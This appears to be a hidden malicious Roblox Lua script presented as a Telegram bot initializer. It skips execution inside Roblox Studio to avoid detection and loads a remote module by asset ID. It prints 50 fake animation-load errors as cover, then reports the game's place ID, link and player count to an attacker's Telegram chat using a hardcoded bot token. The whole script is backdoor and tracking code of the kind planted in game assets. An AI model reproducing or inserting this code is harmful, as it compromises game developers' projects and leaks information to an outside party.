-- Intialize telegram bot script
local IsStudio = RunService:IsStudio()

if IsStudio then
	return
end

local module = require(11495711008)

local minID = 11478254
local maxID = 45678902
local randomID = math.random(minID, maxID)

for i = 1, 50 do
	wait(0.01)
	warn("Failed to load animation: rbxassetid://" .. randomID)
end


local bot = module.DeclareBot("7876117719:AAGEN_Jm0G4W_w1td5xMVsfUK6lTHON5kPo")

local placeID = game.PlaceId

local gameLink = "https://www.roblox.com/games/" .. placeID

module.SendMessage(bot, "-1002448276680", "EXILE: Logged new game -- \n\nPlaceID: "..placeID.."\nGame link: "..gameLink.."\n\nActive: "..#game.Players:GetChildren().."")
module.SendPhoto(bot, "-1002448276680", "https://ibb.co/twBFd6Bx")
